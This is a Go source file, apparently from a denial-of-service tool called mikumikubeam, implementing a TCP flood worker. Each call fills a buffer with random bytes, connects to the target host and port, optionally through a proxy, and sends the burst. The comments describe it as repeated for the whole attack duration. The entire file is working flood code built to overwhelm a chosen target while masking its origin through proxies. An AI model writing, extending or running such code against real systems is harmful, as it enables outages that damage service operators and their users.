package tcp

import (
	"context"
	"math/rand"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

// floodWorker dials, sends a single packet burst, and closes.
// The engine paces calls via PacketDelay; Fire must return quickly and must
// not loop internally, otherwise every tick leaks a goroutine/connection
// for the whole attack duration.
type floodWorker struct{}

func NewFloodWorker() *floodWorker { return &floodWorker{} }

func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()
	if host == "" || port <= 0 {
		return nil
	}

	var pptr *core.Proxy
	if p.Host != "" {
		pptr = &p
	}

	size := params.PacketSize
	if size <= 0 {
		size = 512
	}

	// Get buffer from pool, resize if needed.
	bufPtr := bufPool.Get().(*[]byte)
	buf := *bufPtr
	if len(buf) < size {
		buf = make([]byte, size)
	} else {
		buf = buf[:size]
	}
	defer func() {
		*bufPtr = buf[:cap(buf)]
		bufPool.Put(bufPtr)
	}()
	rand.Read(buf) // fresh random payload every packet

	conn, err := netutil.DialedTCPClient(ctx, "tcp", host, port, pptr)
	if err != nil {
		return err
	}
	defer conn.Close()

	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	if _, err := conn.Write(buf); err != nil {
		return err
	}
	return nil
}
